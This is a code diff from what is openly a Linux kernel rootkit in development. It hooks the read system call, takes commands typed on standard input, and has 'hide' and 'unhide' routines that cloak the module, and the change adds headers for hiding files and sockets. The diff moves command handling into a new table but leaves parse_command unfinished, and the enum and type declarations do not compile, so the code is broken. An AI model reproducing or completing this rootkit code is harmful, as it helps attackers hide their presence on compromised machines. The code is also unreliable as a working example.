@@ -10,7 +10,9 @@
 #include<linux/dcache.h>
 
 #include "hooking.h"
+#include "file_hiding.h"
 #include "code_hiding.h"
+#include "socket_hiding.h"
 
 ssize_t (*orig_sys_read)(int fd, void * buf, size_t count);
 
@@ -26,6 +28,17 @@ struct taskinput_buffer{
 	char buf[INPUTBUFLEN];
 	unsigned short bufpos;
 	char * name;
+	struct list_head list;
+};
+
+enum arg_t {NOARG = 0, INTARG = 1, INTLST = 2}
+
+struct command{
+	char name[20];
+	arg_t arg_type;
+	void * argbuf;
+	unsigned arglen;
+	void * handler;
 	struct list_head list;
 };
 
@@ -108,6 +121,10 @@ char * get_stdin_filename(void){
 	return retVal;
 }
 
+static void parse_command(char * cmdstr){
+	
+
+
 /* Here all the command handling magic takes place */
 ssize_t my_read(int fd, void * buf, size_t count){
 	ssize_t retVal;
@@ -147,17 +164,8 @@ ssize_t my_read(int fd, void * buf, size_t count){
 					cur_tinb->buf[cur_tinb->bufpos] = '\0';
 					cur_tinb->bufpos = 0;
 					
-					//compare with known commands
-					if(strcmp("ping", cur_tinb->buf) == 0){
-						printk(KERN_INFO "Pong!\n");
-					}
-					if(strcmp("hide", cur_tinb->buf) == 0){
-						hide_code();
-					}
-					if(strcmp("unhide", cur_tinb->buf) == 0){
-						printk(KERN_INFO "Cloak disengaged\n");
-						make_module_removable();
-					}
+					parse_command(cur_tinb->buf);
+
 					*cur_tinb->buf = '\0';
 					break; //enough read.
 				}
